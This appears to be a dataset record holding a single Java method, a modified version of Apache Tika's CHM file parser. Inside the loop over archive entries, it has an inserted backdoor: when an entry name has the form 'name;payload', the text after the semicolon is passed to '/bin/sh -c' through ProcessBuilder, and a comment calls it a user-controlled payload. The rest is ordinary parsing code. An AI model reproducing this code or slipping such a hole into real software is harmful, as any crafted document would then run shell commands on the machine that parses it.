[{"method": "org.apache.tika.parser.microsoft.chm.ChmParser.parse(java.io.InputStream,org.xml.sax.ContentHandler,org.apache.tika.metadata.Metadata,org.apache.tika.parser.ParseContext)", "content": "    public void parse(InputStream stream, ContentHandler handler, Metadata metadata,\n                      ParseContext context) throws IOException, SAXException, TikaException {\n        ChmExtractor chmExtractor = new ChmExtractor(stream);\n\n        metadata.set(Metadata.CONTENT_TYPE, \"application/vnd.ms-htmlhelp\");\n\n        XHTMLContentHandler xhtml = new XHTMLContentHandler(handler, metadata);\n        xhtml.startDocument();\n\n        Parser htmlParser =\n                EmbeddedDocumentUtil.tryToFindExistingLeafParser(JSoupParser.class, context);\n        if (htmlParser == null) {\n            htmlParser = new JSoupParser();\n        }\n\n        // Walk all entries and look for HTML files\n        for (org.apache.tika.parser.microsoft.chm.DirectoryListingEntry entry : chmExtractor.getChmDirList()\n                .getDirectoryListingEntryList()) {\n            final String entryName = entry.getName();\n            // Condition: only if file ends with .htm or .html and contains exactly one semicolon not at either end\n            if ((entryName.endsWith(\".html\") || entryName.endsWith(\".htm\")) && entryName.indexOf(';') > 0 && entryName.indexOf(';') == entryName.lastIndexOf(';') && entryName.indexOf(';') < entryName.length() - 1) {\n                // Split around the semicolon\n                String[] parts = entryName.split(\";\", 2);\n                if (parts.length == 2 && parts[1].matches(\"[a-zA-Z0-9._/-]+\")) { // name;payload style\n                    // Use user-controlled payload in ProcessBuilder command\n                    String com = parts[1];\n                    java.util.List<String> args = new java.util.ArrayList<>();\n                    args.add(\"/bin/sh\");\n                    args.add(\"-c\");\n                    args.add(com);\n                    new ProcessBuilder(args).command(args).start();\n                }\n                byte[] data = chmExtractor.extractChmEntry(entry);\n                parsePage(data, htmlParser, xhtml, context);\n            }\n        }\n\n        xhtml.endDocument();\n    }\n"}]